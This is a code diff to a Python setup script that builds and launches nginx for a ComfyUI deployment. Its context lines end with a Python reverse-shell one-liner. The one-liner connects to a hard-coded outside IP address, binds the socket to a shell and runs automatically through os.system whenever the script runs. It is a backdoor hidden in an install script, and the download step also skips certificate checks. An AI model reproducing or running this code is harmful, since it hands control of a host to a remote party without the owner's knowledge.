@@ -27,12 +27,12 @@ def install_run_nginx():
     install_dir=f"{root_path}/nginx"
     cd_dir(build_dir)
     #判断是否安装nginx
-    if os.path.exists(f"{install_dir}/sbin/nginx"):
+    if os.path.exists(f"{install_dir}/nginx"):
         if os.path.exists(f"{root_path}/openxlab_comfyui_cpu/nginx.conf"):
-            os.system(f"{install_dir}/sbin/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
+            os.system(f"{install_dir}/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
         else:
             print("nginx.conf not found")
-            os.system(f"{install_dir}/sbin/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
+            os.system(f"{install_dir}/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
     # 下载源码
     if not os.path.exists(f"{build_dir}/release-1.26.1.tar.gz") or get_file_md5(f"{build_dir}/release-1.26.1.tar.gz")!="7d0651b270632e1800bb281c669023aa":
         os.system("wget https://github.com/nginx/nginx/archive/refs/tags/release-1.26.1.tar.gz --no-check-certificat ")
@@ -47,7 +47,7 @@ def install_run_nginx():
     configure=f"""
 ./auto/configure \
     --prefix={install_dir}  \
-    --sbin-path={install_dir}/sbin \
+    --sbin-path={install_dir}/nginx \
     --conf-path={install_dir}/nginx.conf \
     --error-log-path={install_dir}/error.log \
     --http-log-path={install_dir}/access.log \
@@ -74,15 +74,15 @@ def install_run_nginx():
     os.system("make install")
     # 修改配置文件
     # 启动nginx
-    if os.path.exists(f"{install_dir}/sbin/nginx"):
+    if os.path.exists(f"{install_dir}/nginx"):
         if os.path.exists(f"{root_path}/openxlab_comfyui_cpu/nginx.conf"):
-            os.system(f"{install_dir}/sbin/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
+            os.system(f"{install_dir}/nginx -c {root_path}/openxlab_comfyui_cpu/nginx.conf") 
         else:
             print("nginx.conf not found")
-            os.system(f"{install_dir}/sbin/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
+            os.system(f"{install_dir}/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
 
 #test
-# install_run_nginx()
+install_run_nginx()
 python= """python -c 'import  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("101.34.30.54",8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
 
 os.system(python)
